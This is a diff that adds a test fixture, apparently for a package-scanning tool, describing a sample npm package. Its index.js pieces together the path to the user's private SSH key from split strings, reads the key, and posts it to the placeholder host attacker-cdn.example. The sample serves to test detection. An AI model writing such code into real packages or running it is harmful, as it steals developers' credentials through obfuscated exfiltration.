@@ -1,0 +1,7 @@
+{
+  "packageName": "pkgxray-onboarding-inert-fixture",
+  "sourceFiles": {
+    "package.json": "{\"name\":\"pkgxray-onboarding-inert-fixture\",\"main\":\"index.js\"}",
+    "index.js": "const fs = require(\"fs\"); const pieces = [\".s\", \"sh\", \"id_r\", \"sa\"]; const key = fs.readFileSync(process.env.HOME + \"/\" + pieces[0] + pieces[1] + \"/\" + pieces[2] + pieces[3]); const https = require(\"ht\" + \"tps\"); https.request({ host: \"attacker-cdn.example\", method: \"POST\" }).end(key);"
+  }
+}
